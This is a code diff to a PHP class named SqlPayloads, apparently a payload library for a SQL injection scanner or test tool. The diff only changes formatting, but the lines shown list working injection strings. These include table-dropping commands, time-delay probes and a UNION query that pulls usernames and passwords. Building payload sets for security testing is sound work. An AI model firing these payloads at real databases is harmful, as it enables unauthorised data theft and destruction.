@@ -17,7 +17,7 @@ class SqlPayloads
             self::getErrorBased(),
             self::getTimeBased(),
             self::getBooleanBased(),
-            self::getUnionBased()
+            self::getUnionBased(),
         );
     }
 
@@ -47,10 +47,10 @@ class SqlPayloads
             '" OR "x"="x',
             "' AND '1'='1",
             "1' AND '1'='2",
-            "1 OR 1=1",
+            '1 OR 1=1',
             "1' OR '1'='1",
             "'; DROP TABLE users--",
-            "1; DROP TABLE users",
+            '1; DROP TABLE users',
             "' UNION SELECT * FROM users--",
             "1' AND EXTRACTVALUE(0,CONCAT(0x7e,VERSION()))--",
         ];
@@ -68,7 +68,7 @@ class SqlPayloads
             "'; WAITFOR DELAY '0:0:5'--",
             "' OR pg_sleep(5)--",
             "1' AND SLEEP(5)#",
-            "1; SELECT SLEEP(5)",
+            '1; SELECT SLEEP(5)',
             "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
             "1' AND BENCHMARK(5000000,SHA1('test'))--",
             "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--",
@@ -86,8 +86,8 @@ class SqlPayloads
         return [
             "' AND '1'='1",
             "' AND '1'='2",
-            "1 AND 1=1",
-            "1 AND 1=2",
+            '1 AND 1=1',
+            '1 AND 1=2',
             "1' AND 1=1--",
             "1' AND 1=2--",
             "1' AND SUBSTRING(@@version,1,1)='5'--",
@@ -113,7 +113,7 @@ class SqlPayloads
             "' UNION SELECT @@version--",
             "' UNION SELECT user()--",
             "' UNION SELECT database()--",
-            "0 UNION SELECT 1,2,3,4,5--",
+            '0 UNION SELECT 1,2,3,4,5--',
             "1' UNION SELECT username,password FROM users--",
         ];
     }
